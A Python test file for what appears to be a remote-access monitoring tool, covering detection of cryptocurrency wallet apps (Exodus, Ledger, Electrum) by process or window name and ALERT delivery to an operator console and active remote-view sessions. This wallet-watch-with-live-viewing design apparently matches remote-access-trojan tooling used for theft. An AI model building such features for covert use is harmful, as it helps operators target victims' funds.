"""Tests for crypto/wallet app detection and ALERT fan-out."""
import asyncio
from types import SimpleNamespace
from unittest.mock import patch

import websockets

import protocol as P
from agent.watch_apps import _match_text, scan_matches
from controller.net import ConsoleNet
from tests.test_relay_integration import eventually


class Recorder:
    def __init__(self):
        self.values = []

    def emit(self, *value):
        self.values.append(value[0] if len(value) == 1 else value)


def test_match_exodus_process_name():
    hit = _match_text("Exodus.exe")
    assert hit is not None
    assert hit.label == "Exodus wallet"


def test_match_ledger_window_title():
    hit = _match_text("Ledger Live")
    assert hit is not None
    assert "Ledger" in hit.label


def test_match_ignores_unrelated():
    assert _match_text("chrome.exe") is None
    assert _match_text("Microsoft Edge") is None
    assert _match_text("notepad") is None


def test_scan_matches_from_process_list():
    with patch("agent.watch_apps.list_process_names",
               return_value=["Exodus.exe", "chrome.exe"]), \
         patch("agent.watch_apps.list_window_titles", return_value=[]):
        hits = scan_matches()
    assert len(hits) == 1
    assert hits[0].label == "Exodus wallet"
    assert "Exodus.exe" in hits[0].detail


def test_alert_reaches_console(relay_url):
    async def scenario():
        console_signals = SimpleNamespace(
            devices=Recorder(), status=Recorder(),
            preview=Recorder(), alert=Recorder())
        console = ConsoleNet(relay_url, "test-network", console_signals)
        console.start()
        try:
            async with websockets.connect(relay_url) as agent:
                await agent.send(P.dumps(P.auth_agent(
                    "test-network", "pc1", "Office PC")))
                await eventually(lambda: console_signals.devices.values and any(
                    d.get("id") == "pc1" and d.get("online")
                    for d in console_signals.devices.values[-1]))
                await agent.send(P.dumps(P.alert(
                    "Exodus wallet", "process: Exodus.exe",
                    device_id="ignored", device_name="ignored")))
                await eventually(lambda: bool(console_signals.alert.values))
                alert = console_signals.alert.values[-1]
                assert alert["type"] == P.ALERT
                assert alert["app"] == "Exodus wallet"
                assert alert["device_id"] == "pc1"
                assert alert["device_name"] == "Office PC"
                assert "Exodus.exe" in alert["detail"]
        finally:
            console.stop()
            console.join(timeout=4)
            assert not console.is_alive()
    asyncio.run(scenario())


def test_alert_while_controller_session_active(relay_url):
    """Dashboard still gets ALERT even if someone is viewing the PC."""
    async def scenario():
        console_signals = SimpleNamespace(
            devices=Recorder(), status=Recorder(),
            preview=Recorder(), alert=Recorder())
        console = ConsoleNet(relay_url, "test-network", console_signals)
        console.start()
        try:
            async with websockets.connect(relay_url) as agent:
                await agent.send(P.dumps(P.auth_agent(
                    "test-network", "pc1", "Office PC")))
                await eventually(lambda: console_signals.devices.values and any(
                    d.get("online") for d in console_signals.devices.values[-1]))
                async with websockets.connect(relay_url) as controller:
                    await controller.send(P.dumps(P.auth_controller(
                        "test-network", "pc1")))
                    assert (await asyncio.wait_for(
                        agent.recv(), timeout=3))
                    ctrl_peer = P.loads(await asyncio.wait_for(
                        controller.recv(), timeout=3))
                    assert ctrl_peer["type"] == P.PEER_JOINED

                    await agent.send(P.dumps(P.alert(
                        "Electrum wallet", "process: electrum.exe")))
                    await eventually(
                        lambda: bool(console_signals.alert.values))
                    assert console_signals.alert.values[-1]["app"] == (
                        "Electrum wallet")
                    # Active View session also receives the ALERT text frame.
                    ctrl_alert = P.loads(await asyncio.wait_for(
                        controller.recv(), timeout=3))
                    assert ctrl_alert["type"] == P.ALERT
                    assert ctrl_alert["device_id"] == "pc1"
        finally:
            console.stop()
            console.join(timeout=4)
    asyncio.run(scenario())
